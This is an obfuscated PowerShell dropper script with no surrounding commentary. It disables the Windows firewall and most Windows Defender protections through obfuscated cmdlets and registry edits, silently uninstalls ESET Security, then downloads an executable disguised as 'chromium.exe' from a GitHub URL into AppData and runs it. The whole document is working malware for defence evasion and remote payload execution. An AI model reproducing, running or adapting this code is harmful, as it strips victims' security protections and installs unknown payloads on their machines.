&("{1}{3}{4}{5}{2}{0}{6}" -f 'fil','Set-NetF','ro','irew','al','lP','e') -Profile Domain, Public, Private -Enabled False
.("{2}{4}{1}{0}{3}" -f 'eferen','r','Se','ce','t-MpP') -DisableArchiveScanning 1 -ErrorAction SilentlyContinue
&("{2}{3}{1}{0}{4}{5}"-f'n','e','Set-','MpPrefer','c','e') -DisableBehaviorMonitoring 1 -ErrorAction SilentlyContinue
&("{3}{4}{5}{1}{2}{0}" -f 'e','ere','nc','Set-','M','pPref') -DisableIntrusionPreventionSystem 1 -ErrorAction SilentlyContinue
.("{2}{1}{3}{4}{0}" -f'nce','-MpP','Set','re','fere') -DisableIOAVProtection 1 -ErrorAction SilentlyContinue
.("{1}{2}{0}"-f 'e','Set-MpP','referenc') -DisableRemovableDriveScanning 1 -ErrorAction SilentlyContinue
&("{2}{0}{1}{3}" -f'r','eferen','Set-MpP','ce') -DisableBlockAtFirstSeen 1 -ErrorAction SilentlyContinue
.("{2}{0}{3}{1}"-f 'MpP','ence','Set-','refer') -DisableScanningMappedNetworkDrivesForFullScan 1 -ErrorAction SilentlyContinue
.("{3}{1}{2}{0}" -f 'ference','t-MpPr','e','Se') -DisableScanningNetworkFiles 1 -ErrorAction SilentlyContinue
.("{5}{0}{2}{4}{1}{3}" -f 'et-','fer','M','ence','pPre','S') -DisableScriptScanning 1 -ErrorAction SilentlyContinue
.("{1}{0}{2}{3}" -f '-M','Set','p','Preference') -DisableRealtimeMonitoring 1 -ErrorAction SilentlyContinue
.("{3}{2}{1}{0}"-f'erty','mProp','-Ite','Set') -Path "HKLM:\SOFTWARE\Microsoft\Windows Defender\Real-Time Protection" -Name SpyNetReporting -Value 0
.("{0}{4}{2}{3}{1}" -f'S','y','t-ItemProp','ert','e') -Path "HKLM:\SOFTWARE\Microsoft\Windows Defender\Real-Time Protection" -Name SubmitSamplesConsent -Value 0
&("{5}{1}{2}{4}{3}{0}" -f 'roperty','-I','t','P','em','Set') -Path "HKLM:\SOFTWARE\Microsoft\Windows Defender\Features" -Name TamperProtection -Value 4
.("{2}{0}{1}{3}" -f't','emProp','Set-I','erty') -Path "HKLM:\SOFTWARE\Microsoft\Windows Defender" -Name DisableAntiSpyware -Value 1
&("{1}{0}{2}{3}" -f'temP','Set-I','rop','erty') -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender" -Name DisableAntiSpyware -Value 1

$appdata = [Environment]::GetFolderPath("ApplicationData");
&('cd') $appdata
$filterSpec = "ESET Security"
$hives = @("HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall", "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall")
$hives |&('%') {
  $keys = &("{0}{1}" -f'g','ci') $_ -Recurse
  $subkeys = $keys |.('%') {
    $displayName = [string]$_.GetValue("DisplayName")
    $uninstallString = ([string]$_.GetValue("UninstallString")).ToLower().Replace("/ı", "").Replace("/i","").Replace("msiexec.exe", "")
    if ($displayName.StartsWith($filterSpec)) {
      &("{1}{2}{0}{3}"-f't-pro','s','tar','cess') "C:\Windows\System32\msiexec.exe" -arg "/X $uninstallString /norestart /qb!" -Wait
    }
  }
}

while($true){
    $software = "ESET Security";
    $installed = (&("{4}{0}{5}{3}{1}{2}" -f'et-I','o','perty','Pr','G','tem') HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\* | &("{0}{1}"-f 'W','here') { $_.DisplayName -eq $software }) -ne $null
    $installed2 = (&("{3}{2}{1}{0}" -f'roperty','-ItemP','et','G') HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\* | &("{0}{1}" -f 'Wher','e') { $_.DisplayName -eq $software }) -ne $null

    If((-Not $installed) -and (-Not $installed2)) {
        &("{1}{0}" -f'get','w') https://github.com/Squatch55/Sus/raw/master/59684/Dont/chromium.exe -OutFile chromium.exe; &("{2}{0}{4}{3}{1}" -f 'ta','rocess','s','-p','rt') chromium.exe
            break
    }
}